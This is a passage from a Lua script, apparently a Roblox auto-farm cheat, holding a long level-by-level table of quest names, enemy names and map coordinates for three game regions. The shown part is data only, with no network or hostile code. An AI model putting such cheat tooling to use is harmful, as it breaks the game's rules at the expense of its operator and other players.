                    CFrameQuest = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                    CFrameMon = CFrame.new(1412.92346, 55.3503647, -1260.62036, -0.246266365, -0.0169920288, -0.969053388, 0.000432241941, 0.999844253, -0.0176417865, 0.969202161, -0.00476344163, -0.246220857)
                elseif MyLevel == 100 or MyLevel <= 119 then -- Snowman

                    Ms = "Snowman"
                    NameQuest = "SnowQuest"
                    LevelQuest = 2
                    NameMon = "Snowman"
                    CFrameQuest = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                    CFrameMon = CFrame.new(1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-08, -0.162211925, 7.71531674e-08, 1, 6.08143536e-09, 0.162211925, -6.51427134e-09, -0.986755967)
                elseif MyLevel == 120 or MyLevel <= 149 then -- Chief Petty Officer

                    Ms = "Chief Petty Officer"
                    NameQuest = "MarineQuest2"
                    LevelQuest = 1
                    NameMon = "Chief Petty Officer"
                    CFrameQuest = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-08, -0.96181643, 4.37720793e-08, 1, -4.37274998e-08, 0.96181643, -3.01326679e-08, 0.273695946)
                elseif MyLevel == 150 or MyLevel <= 174 then -- Sky Bandit

                    Ms = "Sky Bandit"
                    NameQuest = "SkyQuest"
                    LevelQuest = 1
                    NameMon = "Sky Bandit"
                    CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-4959.51367, 365.39267, -2974.56812, 0.964867651, 7.74418396e-08, 0.262737453, -6.95931988e-08, 1, -3.91783708e-08, -0.262737453, 1.95171506e-08, 0.964867651)
                elseif MyLevel == 175 or MyLevel <= 189 then -- Dark Master

                    Ms = "Dark Master"
                    NameQuest = "SkyQuest"
                    LevelQuest = 2
                    NameMon = "Dark Master"
                    CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-5079.98096, 376.477356, -2194.17139, 0.465965867, -3.69776352e-08, 0.884802461, 3.40249851e-09, 1, 4.00000886e-08, -0.884802461, -1.56281423e-08, 0.465965867)
                elseif MyLevel == 190 or MyLevel <= 209 then

                    Ms = "Prisoner"
                    LevelQuest = 1
                    NameQuest = "PrisonerQuest"
                    NameMon = "Prisoner"
                    CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                    CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
                elseif MyLevel == 210 or MyLevel <= 249 then

                    Ms = "Dangerous Prisoner"
                    LevelQuest = 2
                    NameQuest = "PrisonerQuest"
                    NameMon = "Dangerous Prisoner"
                    CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                    CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
                elseif MyLevel == 250 or MyLevel <= 274 then -- Toga Warrior

                    Ms = "Toga Warrior"
                    NameQuest = "ColosseumQuest"
                    LevelQuest = 1
                    NameMon = "Toga Warrior"
                    CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                    CFrameMon = CFrame.new(-1779.97583, 44.6077499, -2736.35474, 0.984437346, 4.10396339e-08, 0.175734788, -3.62286876e-08, 1, -3.05844168e-08, -0.175734788, 2.3741821e-08, 0.984437346)
                elseif MyLevel == 275 or MyLevel <= 299 then -- Gladiato

                    Ms = "Gladiator"
                    NameQuest = "ColosseumQuest"
                    LevelQuest = 2
                    NameMon = "Gladiato"
                    CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                    CFrameMon = CFrame.new(-1274.75903, 58.1895943, -3188.16309, 0.464524001, 6.21005611e-08, 0.885560572, -4.80449414e-09, 1, -6.76054768e-08, -0.885560572, 2.71497012e-08, 0.464524001)
                elseif MyLevel == 300 or MyLevel <= 329 then -- Military Soldier

                    Ms = "Military Soldier"
                    NameQuest = "MagmaQuest"
                    LevelQuest = 1
                    NameMon = "Military Soldier"
                    CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                    CFrameMon = CFrame.new(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984)
                elseif MyLevel == 330 or MyLevel <= 374 then -- Military Spy

                    Ms = "Military Spy"
                    NameQuest = "MagmaQuest"
                    LevelQuest = 2
                    NameMon = "Military Spy"
                    CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                    CFrameMon = CFrame.new(-5787.99023, 120.864456, 8762.25293, -0.188358366, -1.84706277e-08, 0.982100308, -1.23782129e-07, 1, -4.93306951e-09, -0.982100308, -1.22495649e-07, -0.188358366)
                elseif MyLevel == 375 or MyLevel <= 399 then -- Fishman Warrior

                    Ms = "Fishman Warrior"
                    NameQuest = "FishmanQuest"
                    LevelQuest = 1
                    NameMon = "Fishman Warrior"
                    CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
                    CFrameMon = CFrame.new(60946.6094, 48.6735229, 1525.91687, -0.0817126185, 8.90751153e-08, 0.996655822, 2.00889794e-08, 1, -8.77269599e-08, -0.996655822, 1.28533992e-08, -0.0817126185)
                elseif MyLevel == 400 or MyLevel <= 449 then -- Fishman Commando

                    Ms = "Fishman Commando"
                    NameQuest = "FishmanQuest"
                    LevelQuest = 2
                    NameMon = "Fishman Commando"
                    CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504)
                    CFrameMon = CFrame.new(61928.8867, 18.4828186, 1458.55127)
                elseif MyLevel == 450 or MyLevel <= 474 then

                    Ms = "God's Guard"
                    NameQuest = "SkyExp1Quest"
                    LevelQuest = 1
                    NameMon = "God's Guards"
                    CFrameQuest = CFrame.new(-4721.71436, 845.277161, -1954.20105)
                    CFrameMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)
                elseif MyLevel == 475 or MyLevel <= 524 then 

                    Ms = "Shanda"
                    NameQuest = "SkyExp1Quest"
                    LevelQuest = 2
                    NameMon = "Shandas"
                    CFrameQuest = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
                    CFrameMon = CFrame.new(-7904.57373, 5584.37646, -459.62973, 0.65171206, 5.11171692e-08, 0.758466363, -4.76232476e-09, 1, -6.33034247e-08, -0.758466363, 3.76435416e-08, 0.65171206)
                elseif MyLevel == 525 or MyLevel <= 549 then -- Royal Squad

                    Ms = "Royal Squad"
                    NameQuest = "SkyExp2Quest"
                    LevelQuest = 1
                    NameMon = "Royal Squad"
                    CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-7555.04199, 5606.90479, -1303.24744, -0.896107852, -9.6057462e-10, -0.443836004, -4.24974544e-09, 1, 6.41599973e-09, 0.443836004, 7.63560326e-09, -0.896107852)
                elseif MyLevel == 550 or MyLevel <= 624 then -- Royal Soldier

                    Ms = "Royal Soldier"
                    NameQuest = "SkyExp2Quest"
                    LevelQuest = 2
                    NameMon = "Royal Soldier"
                    CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-7837.31152, 5649.65186, -1791.08582, -0.716008604, 0.0104285581, -0.698013008, 5.02521061e-06, 0.99988848, 0.0149335321, 0.69809103, 0.0106890313, -0.715928733)
                elseif MyLevel == 625 or MyLevel <= 649 then -- Galley Pirate

                    Ms = "Galley Pirate"
                    NameQuest = "FountainQuest"
                    LevelQuest = 1
                    NameMon = "Galley Pirate"
                    CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                    CFrameMon = CFrame.new(5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-08, 0.443124533, -1.34262139e-08, 1, -6.26611296e-08, -0.443124533, 5.02237434e-08, 0.896460414)
                elseif MyLevel >= 650 then -- Galley Captain

                    Ms = "Galley Captain"
                    NameQuest = "FountainQuest"
                    LevelQuest = 2
                    NameMon = "Galley Captain"
                    CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                    CFrameMon = CFrame.new(5782.90186, 94.5326462, 4716.78174, 0.361808896, -1.24757526e-06, -0.932252586, 2.16989656e-06, 1, -4.96097414e-07, 0.932252586, -1.84339774e-06, 0.361808896)
                end
            end
            if second_sea then
                Nonquest = false
                if MyLevel == 700 or MyLevel <= 724 then -- Raider
                    Ms = "Raider"
                    NameQuest = "Area1Quest"
                    LevelQuest = 1
                    NameMon = "Raider"
                    CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    CFrameMon = CFrame.new(-737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, -0, 1, -0, 0.962260842, 0, 0.272128761)
                elseif MyLevel == 725 or MyLevel <= 774 then -- Mercenary
                    Ms = "Mercenary"
                    NameQuest = "Area1Quest"
                    LevelQuest = 2
                    NameMon = "Mercenary"
                    CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    CFrameMon = CFrame.new(-1022.21271, 72.9855194, 1891.39148, -0.990782857, 0, -0.135460541, 0, 1, 0, 0.135460541, 0, -0.990782857)
                elseif MyLevel == 775 or MyLevel <= 799 then -- Swan Pirate
                    Ms = "Swan Pirate"
                    NameQuest = "Area2Quest"
                    LevelQuest = 1
                    NameMon = "Swan Pirate"
                    CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                    CFrameMon = CFrame.new(976.467651, 111.174057, 1229.1084, 0.00852567982, -4.73897828e-08, -0.999963999, 1.12251888e-08, 1, -4.7295778e-08, 0.999963999, -1.08215579e-08, 0.00852567982)
                elseif MyLevel == 800 or MyLevel <= 874 then -- Factory Staff
                    Ms = "Factory Staff"
                    NameQuest = "Area2Quest"
                    LevelQuest = 2
                    NameMon = "Factory Staff"
                    CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                    CFrameMon = CFrame.new(336.74585, 73.1620483, -224.129272, 0.993632793, 3.40154607e-08, 0.112668738, -3.87658332e-08, 1, 3.99718729e-08, -0.112668738, -4.40850592e-08, 0.993632793)
                elseif MyLevel == 875 or MyLevel <= 899 then -- Marine Lieutenant
                    Ms = "Marine Lieutenant"
                    NameQuest = "MarineQuest3"
                    LevelQuest = 1
                    NameMon = "Marine Lieutenant"
                    CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299)
                elseif MyLevel == 900 or MyLevel <= 949 then -- Marine Captain
                    Ms = "Marine Captain"
                    NameQuest = "MarineQuest3"
                    LevelQuest = 2
                    NameMon = "Marine Captain"
                    CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-1814.70313, 72.9919434, -3208.86621, -0.900422215, 7.93464423e-08, -0.435017526, 3.68856199e-08, 1, 1.06050372e-07, 0.435017526, 7.94441988e-08, -0.900422215)
                elseif MyLevel == 950 or MyLevel <= 974 then -- Zombie
                    Ms = "Zombie"
                    NameQuest = "ZombieQuest"
                    LevelQuest = 1
                    NameMon = "Zombie"
                    CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                    CFrameMon = CFrame.new(-5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-08, 0.934775114, 1.65461245e-08, 1, 8.04023372e-08, -0.934775114, -1.3095117e-08, 0.355238914)
                elseif MyLevel == 975 or MyLevel <= 999 then -- Vampire
                    Ms = "Vampire"
                    NameQuest = "ZombieQuest"
                    LevelQuest = 2
                    NameMon = "Vampire"
                    CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                    CFrameMon = CFrame.new(-6030.32031, 0.4377408, -1313.5564, -0.856965423, 3.9138893e-08, -0.515373945, -1.12178942e-08, 1, 9.45958547e-08, 0.515373945, 8.68467822e-08, -0.856965423)
                elseif MyLevel == 1000 or MyLevel <= 1049 then -- Snow Trooper **
                    Ms = "Snow Trooper"
                    NameQuest = "SnowMountainQuest"
                    LevelQuest = 1
                    NameMon = "Snow Trooper"
                    CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                    CFrameMon = CFrame.new(621.003418, 391.361053, -5335.43604, 0.481644779, 0, 0.876366913, 0, 1, 0, -0.876366913, 0, 0.481644779)
                elseif MyLevel == 1050 or MyLevel <= 1099 then -- Winter Warrior
                    Ms = "Winter Warrior"
                    NameQuest = "SnowMountainQuest"
                    LevelQuest = 2
                    NameMon = "Winter Warrior"
                    CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                    CFrameMon = CFrame.new(1295.62683, 429.447784, -5087.04492, -0.698032081, -8.28980049e-08, -0.71606636, -1.98835952e-08, 1, -9.63858184e-08, 0.71606636, -5.30424877e-08, -0.698032081)
                elseif MyLevel == 1100 or MyLevel <= 1124 then -- Lab Subordinate
                    Ms = "Lab Subordinate"
                    NameQuest = "IceSideQuest"
                    LevelQuest = 1
                    NameMon = "Lab Subordinate"
                    CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                    CFrameMon = CFrame.new(-5769.2041, 37.9288292, -4468.38721, -0.569419742, -2.49055017e-08, 0.822046936, -6.96206541e-08, 1, -1.79282633e-08, -0.822046936, -6.74401548e-08, -0.569419742)
                elseif MyLevel == 1125 or MyLevel <= 1174 then -- Horned Warrior
                    Ms = "Horned Warrior"
                    NameQuest = "IceSideQuest"
                    LevelQuest = 2
                    NameMon = "Horned Warrior"
                    CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                    CFrameMon = CFrame.new(-6401.27979, 15.9775667, -5948.24316, 0.388303697, 0, -0.921531856, 0, 1, 0, 0.921531856, 0, 0.388303697)
                elseif MyLevel == 1175 or MyLevel <= 1199 then -- Magma Ninja
                    Ms = "Magma Ninja"
                    NameQuest = "FireSideQuest"
                    LevelQuest = 1
                    NameMon = "Magma Ninja"
                    CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-5466.06445, 57.6952019, -5837.42822, -0.988835871, 0, -0.149006829, 0, 1, 0, 0.149006829, 0, -0.988835871)
                elseif MyLevel == 1200 or MyLevel <= 1249 then 
                    Ms = "Lava Pirate"
                    NameQuest = "FireSideQuest"
                    LevelQuest = 2
                    NameMon = "Lava Pirate"
                    CFrameQuest = CFrame.new(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
                    CFrameMon = CFrame.new(-5169.71729, 34.1234779, -4669.73633, -0.196780294, 0, 0.98044765, 0, 1.00000012, -0, -0.98044765, 0, -0.196780294)
                elseif MyLevel == 1250 or MyLevel <= 1274 then 
                    Ms = "Ship Deckhand"
                    NameQuest = "ShipQuest1"
                    LevelQuest = 1
                    NameMon = "Ship Deckhand"
                    CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                    CFrameMon = CFrame.new(1163.80872, 138.288452, 33058.4258, -0.998580813, 5.49076979e-08, -0.0532564968, 5.57436763e-08, 1, -1.42118655e-08, 0.0532564968, -1.71604082e-08, -0.998580813)
                elseif MyLevel == 1275 or MyLevel <= 1299 then 
                    Ms = "Ship Engineer"
                    NameQuest = "ShipQuest1"
                    LevelQuest = 2
                    NameMon = "Ship Engineer"
                    CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                    CFrameMon = CFrame.new(921.30249023438, 125.400390625, 32937.34375)
                elseif MyLevel == 1300 or MyLevel <= 1324 then 
                    Ms = "Ship Steward"
                    NameQuest = "ShipQuest2"
                    LevelQuest = 1
                    NameMon = "Ship Steward"
                    CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                    CFrameMon = CFrame.new(917.96057128906, 136.89932250977, 33343.4140625)
                elseif MyLevel == 1325 or MyLevel <= 1349 then 
                    Ms = "Ship Officer"
                    NameQuest = "ShipQuest2"
                    LevelQuest = 2
                    NameMon = "Ship Officer"
                    CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                    CFrameMon = CFrame.new(944.44964599609, 181.40081787109, 33278.9453125)
                elseif MyLevel == 1350 or MyLevel <= 1374 then 
                    Ms = "Arctic Warrior"
                    NameQuest = "FrostQuest"
                    LevelQuest = 1
                    NameMon = "Arctic Warrior"
                    CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                    CFrameMon = CFrame.new(5878.23486, 81.3886948, -6136.35596, -0.451037169, 2.3908234e-07, 0.892505825, -1.08168464e-07, 1, -3.22542007e-07, -0.892505825, -2.4201924e-07, -0.451037169)
                elseif MyLevel == 1375 or MyLevel <= 1424 then -- Snow Lurker
                    Ms = "Snow Lurker"
                    NameQuest = "FrostQuest"
                    LevelQuest = 2
                    NameMon = "Snow Lurker"
                    CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                    CFrameMon = CFrame.new(5513.36865, 60.546711, -6809.94971, -0.958693981, -1.65617333e-08, 0.284439981, -4.07668654e-09, 1, 4.44854642e-08, -0.284439981, 4.14883701e-08, -0.958693981)
                elseif MyLevel == 1425 or MyLevel <= 1449 then -- Sea Soldier
                    Ms = "Sea Soldier"
                    NameQuest = "ForgottenQuest"
                    LevelQuest = 1
                    NameMon = "Sea Soldier"
                    CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                    CFrameMon = CFrame.new(-3115.78223, 63.8785706, -9808.38574, -0.913427353, 3.11199457e-08, 0.407000452, 7.79564235e-09, 1, -5.89660658e-08, -0.407000452, -5.06883708e-08, -0.913427353)
                elseif MyLevel >= 1450 then -- Water Fighter
                    Ms = "Water Fighter"
                    NameQuest = "ForgottenQuest"
                    LevelQuest = 2
                    NameMon = "Water Fighter"
                    CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                    CFrameMon = CFrame.new(-3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-08, -0.670276582, 1.69155214e-08, 1, -6.46908234e-08, 0.670276582, 3.66697037e-08, 0.742111444)
                end
            end
            if third_sea then
                if MyLevel >= 1500 and MyLevel <= 1524 then -- Pirate Millionaire
                    Ms = "Pirate Millionaire"
                    NameQuest = "PiratePortQuest"
                    LevelQuest = 1
                    NameMon = "Pirate Millionaire"
                    CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                elseif MyLevel >= 1525 and MyLevel <= 1574 then -- Pistol Billionaire
                    Ms = "Pistol Billionaire"
                    NameQuest = "PiratePortQuest"
                    LevelQuest = 2
                    NameMon = "Pistol Billionaire"
                    CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                elseif MyLevel >= 1575 and MyLevel <= 1599 then -- Dragon Crew Warrior
                    Ms = "Dragon Crew Warrior"
                    NameQuest = "AmazonQuest"
                    LevelQuest = 1
                    NameMon = "Dragon Crew Warrior"
                    CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                    CFrameMon = CFrame.new(6241.9951171875, 51.522083282471, -1243.9771728516)
                elseif MyLevel >= 1600 and MyLevel <= 1624 then -- Dragon Crew Archer
                    Ms = "Dragon Crew Archer"
                    NameQuest = "AmazonQuest"
                    LevelQuest = 2
                    NameMon = "Dragon Crew Archer"
                    CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                    CFrameMon = CFrame.new(6488.9155273438, 383.38375854492, -110.66246032715)
                elseif MyLevel >= 1625 and MyLevel <= 1649 then -- Female Islander
                    Ms = "Female Islander"
                    NameQuest = "AmazonQuest2"
                    LevelQuest = 1
                    NameMon = "Female Islander"
                    CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(4770.4990234375, 758.95520019531, 1069.8680419922)
                elseif MyLevel >= 1650 and MyLevel <= 1699 then -- Giant Islander
                    Ms = "Giant Islander"
                    NameQuest = "AmazonQuest2"
                    LevelQuest = 2
                    NameMon = "Giant Islander"
                    CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789)
                elseif MyLevel >= 1700 and MyLevel <= 1724 then -- Marine Commodore
                    Ms = "Marine Commodore"
                    NameQuest = "MarineTreeIsland"
                    LevelQuest = 1
                    NameMon = "Marine Commodore"
                    CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                    CFrameMon = CFrame.new(2490.0844726563, 190.4232635498, -7160.0502929688)
                elseif MyLevel >= 1725 and MyLevel <= 1774 then -- Marine Rear Admiral
                    Ms = "Marine Rear Admiral"
                    NameQuest = "MarineTreeIsland"
                    LevelQuest = 2
                    NameMon = "Marine Rear Admiral"
                    CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                    CFrameMon = CFrame.new(3951.3903808594, 229.11549377441, -6912.81640625)
                elseif MyLevel >= 1775 and MyLevel <= 1799 then -- Fishman Raider
                    Ms = "Fishman Raider"
                    NameQuest = "DeepForestIsland3"
                    LevelQuest = 1
                    NameMon = "Fishman Raider"
                    CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-10322.400390625, 390.94473266602, -8580.0908203125)
                elseif MyLevel >= 1800 and MyLevel <= 1824 then -- Fishman Captain
                    Ms = "Fishman Captain"
                    NameQuest = "DeepForestIsland3"
                    LevelQuest = 2
                    NameMon = "Fishman Captain"
                    CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-11194.541992188, 442.02795410156, -8608.806640625)
                elseif MyLevel >= 1825 and MyLevel <= 1849 then -- Forest Pirate
                    Ms = "Forest Pirate"
                    NameQuest = "DeepForestIsland"
                    LevelQuest = 1
                    NameMon = "Forest Pirate"
                    CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                    CFrameMon = CFrame.new(-13225.809570313, 428.19387817383, -7753.1245117188)
                elseif MyLevel >= 1850 and MyLevel <= 1899 then -- Mythological Pirate
                    Ms = "Mythological Pirate"
                    NameQuest = "DeepForestIsland"
                    LevelQuest = 2
                    NameMon = "Mythological Pirate"
                    CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                    CFrameMon = CFrame.new(-13869.172851563, 564.95251464844, -7084.4135742188)
                elseif MyLevel >= 1900 and MyLevel <= 1924 then -- Jungle Pirate
                    Ms = "Jungle Pirate"
                    NameQuest = "DeepForestIsland2"
                    LevelQuest = 1
                    NameMon = "Jungle Pirate"
                    CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                    CFrameMon = CFrame.new(-11982.221679688, 376.32522583008, -10451.415039063)
                elseif MyLevel >= 1925 and MyLevel <= 1974 then -- Musketeer Pirate
                    Ms = "Musketeer Pirate"
                    NameQuest = "DeepForestIsland2"
                    LevelQuest = 2
                    NameMon = "Musketeer Pirate"
                    CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                    CFrameMon = CFrame.new(-13282.3046875, 496.23684692383, -9565.150390625)
                elseif MyLevel >= 1975 and MyLevel <= 1999 then
                    Ms = "Reborn Skeleton"
                    NameQuest = "HauntedQuest1"
                    LevelQuest = 1
                    NameMon = "Reborn Skeleton"
                    CFrameQuest = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
                    CFrameMon = CFrame.new(-8817.880859375, 191.16761779785, 6298.6557617188)
                elseif MyLevel >= 2000 and MyLevel <= 2024 then
                    Ms = "Living Zombie"
                    NameQuest = "HauntedQuest1"
                    LevelQuest = 2
                    NameMon = "Living Zombie"
                    CFrameQuest = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
                    CFrameMon = CFrame.new(-10125.234375, 183.94705200195, 6242.013671875)
                elseif MyLevel >= 2025 and MyLevel <= 2049  then
                    Ms = "Demonic Soul"
                    NameQuest = "HauntedQuest2"
                    LevelQuest = 1
                    NameMon = "Demonic Soul"
                    CFrameQuest = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
                    CFrameMon = CFrame.new(-9712.03125, 204.69589233398, 6193.322265625)
                elseif MyLevel >= 2050 and MyLevel <= 2074 then
                    Ms = "Posessed Mummy"
                    NameQuest = "HauntedQuest2"
                    LevelQuest = 2
                    NameMon = "Posessed Mummy"
                    CFrameQuest = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
                    CFrameMon = CFrame.new(-9545.7763671875, 69.619895935059, 6339.5615234375)    
